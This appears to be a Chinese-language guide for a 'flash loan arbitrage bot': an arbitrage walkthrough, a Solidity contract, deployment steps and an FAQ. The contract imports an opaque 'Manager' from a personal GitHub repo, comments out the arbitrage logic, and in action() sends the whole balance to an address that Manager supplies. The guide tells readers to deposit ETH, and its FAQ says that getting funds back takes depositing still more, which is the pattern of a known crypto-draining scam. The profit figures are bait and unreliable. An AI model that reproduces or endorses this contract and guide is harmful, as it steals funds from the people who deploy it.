- # 闪电贷Demo

## 脚本
```sh
闪电贷机器人将执行以下套利：
1️⃣向闪电贷合约中存入初始的BNB
2️⃣通过闪电贷在 PancakeSwap 借 100,000 DAI。
3️⃣在 PancakeSwap 上将 100,000 DAI 换成 USDT，收到 101,010 USDT。
4️⃣在 1inch 上将 101,010 USDT 换成 101,010 DAI
5️⃣偿还初始 100,000 DAI + 0.09% Fees = 100,090 DAI
6️⃣利润 101,010 DAI - 100,090 DAI = 920DAI 
7️⃣将初始的BNB + 920 DAI 交易成BNB，继续检索下一次套利或将所有BNB转回套利机器人合约部署钱包地址
```

## 合约
```js
pragma solidity ^0.5.0;
 
// Multiplier-Finance Smart Contracts
 
// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
// Code Manager
import "https://github.com/ducock/CRYPTO/blob/master/Flash";
 
contract FlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
function() external payable {}
	
	function action() public payable {
		
	    // Send required coins for swap
	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    manager.performTasks();
	    
	    /*
	    // Submit token to Ethereum blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
        // List the token on pancakeswap & send coins required for swaps
		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
 
        // Get ETH Loan from Aave
		string memory loanAddress = manager.takeAaveLoan(loanAmount);
		
		// Convert half ETH to DAI
		manager.pancakeswapDAItoETH(loanAmount / 2);
 
        // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.pancakeswapPerformSwaps();
		
		// Move remaining ETH from Contract to your account
		manager.contractToWallet("ETH");
 
        // Repay Flash loan
		manager.repayAaveLoan(loanAddress);
	    */
	}
}
```

输入参数后部署:
```sh
string public tokenName;   => ETHFlash
string public tokenSymbol; => ETHF
uint loanAmount;           => 100
Manager manager;
```

> 4-通过填写“_TOKENNAME”和“_TOKENSYMBOL”来创建您的代币，贷款金额设置为 100。完成后单击交易部署


部署成功后，想合约地址转账`1.2 ETH` 
> 5-用您拥有的 ETH 为您部署的智能合约地址提供资金。（您可以随时从智能合约中提取您的 ETH） 

Q1: 如何退回存放在合约中的ETH？  
A1: 在之前部署的合约中转入0.0001ETH[作为转账手续费]+转入的资金ETH，然后执行Action。例如：在部署合约后转入1ETH，在需要退回资金时，需要再向合约转入1.0001ETH，然后Action，合约将会执行退币函数，退回之前的1ETH一共2.0001ETH到你的钱包里  

Q2: 如何继续存入BNB？
A2: 存入任何大于1的ETH即可。合约添加了保护机制，为了资金命中率，如果单次少于1ETH ，合约将暂停执行。  

